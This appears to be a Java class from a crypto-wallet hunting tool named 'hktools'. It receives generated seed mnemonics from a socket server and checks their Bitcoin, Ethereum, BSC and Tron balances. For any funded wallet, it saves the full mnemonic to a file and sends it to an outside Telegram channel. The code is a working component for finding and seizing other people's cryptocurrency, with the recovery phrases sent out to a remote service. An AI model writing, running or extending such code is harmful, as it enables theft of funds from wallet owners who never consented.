package com.hktools;

import com.hktools.model.CoinEntry;
import com.hktools.model.Wallet;
import com.hktools.parser.JsonMessageParser;
import com.hktools.service.BtcScan;
import com.hktools.service.EthereumWeb3;
import com.hktools.service.Telegram;
import com.hktools.service.Tronscan;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.slf4j.Marker;
import org.slf4j.MarkerFactory;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.math.BigDecimal;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Optional;

/**
 * WalletClient composes a SocketClient and a JsonMessageParser.
 * It connects to server, listens for lines, parses JSON wallet messages
 * (parser already ignores non-JSON lines) and stores parsed Wallets in-memory.
 */
public class WalletClient {
    private static final Logger logger = LoggerFactory.getLogger(WalletClient.class);
    private static final Marker WALLET_FOUND = MarkerFactory.getMarker("WALLET_FOUND");

    private final int id;
    private final SocketClient client;
    private final JsonMessageParser parser = new JsonMessageParser();
    private final List<Wallet> storedWallets = Collections.synchronizedList(new ArrayList<>());
    private volatile boolean started = false;

    // Balance checking services
    private final BtcScan btcScan = new BtcScan();
    private final EthereumWeb3 ethWeb3 = new EthereumWeb3(EthereumWeb3.Network.ETHEREUM);
    private final EthereumWeb3 bscWeb3 = new EthereumWeb3(EthereumWeb3.Network.BSC);
    private final Tronscan tronscan = new Tronscan();
    private final String walletFilePath = "wallets_with_balance.txt";
    private int checkCount = 0;

    public WalletClient(int id, String host, int port, int timeoutMs, boolean autoReconnect) {
        this.id = id;
        this.client = new SocketClient(host, port, timeoutMs, autoReconnect);
    }

    public void start() throws IOException {
        client.connect();
        client.startListening(line -> {
            logger.info("[client-{}] Received: {}", id, line);
            try {
                Optional<Wallet> maybe = parser.parseLine(line);
                maybe.ifPresent(wallet -> {
//                    storedWallets.add(wallet);
                    logger.info("[client-{}] Stored wallet mnemonic (first word): {}", id,
                            wallet.mnemonic == null ? "" : wallet.mnemonic.split("\\s+")[0]);

                    // Check balances for this wallet
                    checkBalancesAndSave(wallet);
                    if(++checkCount % 10 == 0) {
                        logger.warn("[client-{}] Check {}", id, checkCount);
                    }
                    try {
                        client.sendLine("newwallet");
                    } catch (IOException e) {
                        this.client.close();
                        try {
                            start();
                        } catch (IOException ex) {
                            throw new RuntimeException(ex);
                        }
                    }
                });
            } catch (Exception e) {
                logger.error("[client-{}] Error while parsing line: {}", id, e.getMessage(), e);
            }
        });
        started = true;
    }

    public void stop() {
        client.close();
        started = false;
    }

    public void sendLine(String line) throws IOException {
        client.sendLine(line);
    }

    public List<Wallet> getStoredWallets() {
        return storedWallets;
    }

    public int getId() {
        return id;
    }

    public boolean isStarted() {
        return started;
    }

    /**
     * Check balances for all coins in the wallet and save to file if any balance > 0
     */
    private void checkBalancesAndSave(Wallet wallet) {
        List<String> walletsWithBalance = new ArrayList<>();
        boolean hasBalance = false;

        logger.info("[client-{}] Checking balances for wallet...", id);

        for (CoinEntry coin : wallet.coins) {
            try {
                String coinName = coin.name.toUpperCase();
                String address = coin.address;

                switch (coinName) {
                    case "BITCOIN":
                        int btcTxCount = btcScan.getBalance(address);
                        if (btcTxCount > 0) {
                            hasBalance = true;
                            String btcInfo = String.format("BTC - Address: %s, TX Count: %d", address, btcTxCount);
                            walletsWithBalance.add(btcInfo);
                            logger.info("[client-{}] FOUND BTC BALANCE! {}", id, btcInfo);
                        }
                        break;

                    case "ETHEREUM":
                        BigDecimal ethBalance = ethWeb3.getBalance(address);
                        if (ethBalance.compareTo(BigDecimal.ZERO) > 0) {
                            hasBalance = true;
                            String ethInfo = String.format("ETH - Address: %s, Balance: %s", address, ethBalance.toPlainString());
                            walletsWithBalance.add(ethInfo);
                            logger.info("[client-{}] FOUND ETH BALANCE! {}", id, ethInfo);
                        }
//                        break;
//
//                    case "BSC":
                        BigDecimal bscBalance = bscWeb3.getBalance(address);
                        if (bscBalance.compareTo(BigDecimal.ZERO) > 0) {
                            hasBalance = true;
                            String bscInfo = String.format("BSC - Address: %s, Balance: %s", address, bscBalance.toPlainString());
                            walletsWithBalance.add(bscInfo);
                            logger.info("[client-{}] FOUND BSC BALANCE! {}", id, bscInfo);
                        }
                        break;

                    case "TRX":
                    case "TRON":
                        int trxBalance = tronscan.getBalance(address);
                        if (trxBalance > 0) {
                            hasBalance = true;
                            // TRX balance is in sun (1 TRX = 1,000,000 sun)
                            double trxAmount = trxBalance / 1_000_000.0;
                            String trxInfo = String.format("TRX - Address: %s, Balance: %.6f TRX (%d sun)",
                                address, trxAmount, trxBalance);
                            walletsWithBalance.add(trxInfo);
                            logger.info("[client-{}] FOUND TRX BALANCE! {}", id, trxInfo);
                        }
                        break;

                    default:
                        logger.debug("[client-{}] Skipping unknown coin: {}", id, coinName);
                }
            } catch (Exception e) {
                logger.error("[client-{}] Error checking balance for {} ({}): {}",
                    id, coin.name, coin.address, e.getMessage(), e);
            }
        }

        // If any balance found, save to file
        if (hasBalance) {
            saveWalletToFile(wallet, walletsWithBalance);
        }
    }

    /**
     * Save wallet with balance information to file
     */
    private void saveWalletToFile(Wallet wallet, List<String> walletsWithBalance) {
        synchronized (this) {
            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
            try (FileWriter fw = new FileWriter(walletFilePath, true);
                 PrintWriter pw = new PrintWriter(fw)) {

                pw.println("================================================================================");
                pw.println("Timestamp: " + timestamp);
                pw.println("Client ID: " + id);
                pw.println("Mnemonic: " + wallet.mnemonic);
                pw.println("--------------------------------------------------------------------------------");

                for (String balanceInfo : walletsWithBalance) {
                    pw.println(balanceInfo);
                }

                pw.println("All coins in wallet:");
                for (CoinEntry coin : wallet.coins) {
                    pw.println(String.format("  %s - Address: %s", coin.name, coin.address));
                }

                pw.println("================================================================================");
                pw.println();

                logger.info("[client-{}] Wallet with balance saved to {}", id, walletFilePath);
            } catch (IOException e) {
                logger.error("[client-{}] Error saving wallet to file: {}", id, e.getMessage(), e);
            }
            try {

                // Log to dedicated wallet balance log file with WALLET_FOUND marker
                StringBuilder logMessage = new StringBuilder();
                logMessage.append(String.format("\n[client-%d] ================ WALLET WITH BALANCE FOUND ================\n", id));
                logMessage.append(String.format("Timestamp: %s\n", timestamp));
                logMessage.append(String.format("Mnemonic: %s\n", wallet.mnemonic));
                logMessage.append("----------------------------------------\n");
                logMessage.append("Balances Found:\n");
                for (String balanceInfo : walletsWithBalance) {
                    logMessage.append(String.format("  %s\n", balanceInfo));
                }
                logMessage.append("----------------------------------------\n");
                logMessage.append("All coins in wallet:\n");
                for (CoinEntry coin : wallet.coins) {
                    logMessage.append(String.format("  %s - Address: %s\n", coin.name, coin.address));
                }
                logMessage.append("================================================================");

                logger.info(WALLET_FOUND, logMessage.toString());
                Telegram.getInstance().sendMessage(logMessage.toString());
            } catch (Exception e) {
                logger.warn("[client-{}] Error logging wallet with balance: {}", id, e.getMessage(), e);
            }
        }
    }
}

